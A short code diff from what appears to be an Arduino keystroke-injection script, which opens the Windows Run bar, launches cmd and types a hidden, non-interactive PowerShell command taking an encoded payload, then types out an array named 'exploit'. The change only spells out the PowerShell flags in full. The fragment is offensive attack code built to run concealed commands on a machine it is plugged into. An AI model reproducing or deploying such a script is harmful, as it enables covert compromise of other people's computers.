@@ -70,7 +70,7 @@ void loop()
   delay(5000);
   CommandAtRunBar("cmd");
   delay(750);
-  Keyboard.print("powershell -nop -win hidden -noni -enc ");
+  Keyboard.print("powershell -nop -window hidden -noni -EncodedCommand ");
   // Write the binary to the notepad file
   int i;
   for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
